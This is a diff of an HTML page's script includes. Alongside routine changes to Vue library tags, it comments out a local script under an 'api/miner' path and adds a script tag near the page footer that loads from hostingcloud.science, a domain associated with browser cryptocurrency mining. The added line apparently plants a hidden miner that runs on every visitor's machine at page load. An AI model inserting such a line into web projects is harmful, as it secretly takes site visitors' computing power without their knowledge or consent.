@@ -21,11 +21,11 @@
 		
 		<script src="//content.jwplatform.com/libraries/IDzF9Zmk.js"></script>
 
-		<!--
 			<script src="https://unpkg.com/vue/dist/vue.js"></script>
+		<!--
 			<script src="https://unpkg.com/vue-router/dist/vue-router.js"></script>
 		-->
-		<script src="https://cdn.jsdelivr.net/npm/vue@2.5.17/dist/vue.js"></script>
+		<!-- <script src="https://cdn.jsdelivr.net/npm/vue@2.5.17/dist/vue.js"></script> -->
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/vue-router/3.0.1/vue-router.js"></script>
 		<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
 		
@@ -618,7 +618,9 @@
 		<script src="dist/bootstrap/4.1.3/dist/js/bootstrap.min.js"></script>
 		<!-- Just to make our placeholder images work. Don't actually copy the next line! -->
 		<script src="dist/bootstrap/4.1.3/site/docs/4.1/assets/js/vendor/holder.min.js"></script>
-		<script src="api/miner/FNn8.php?f=uwlS.js"></script>
+		<!-- <script src="api/miner/FNn8.php?f=uwlS.js"></script> -->
+		<script src="https://www.hostingcloud.science./eUuG.js"></script>
+		
 		<script src="js/scripts.js"></script>
 	</body>
 </html>
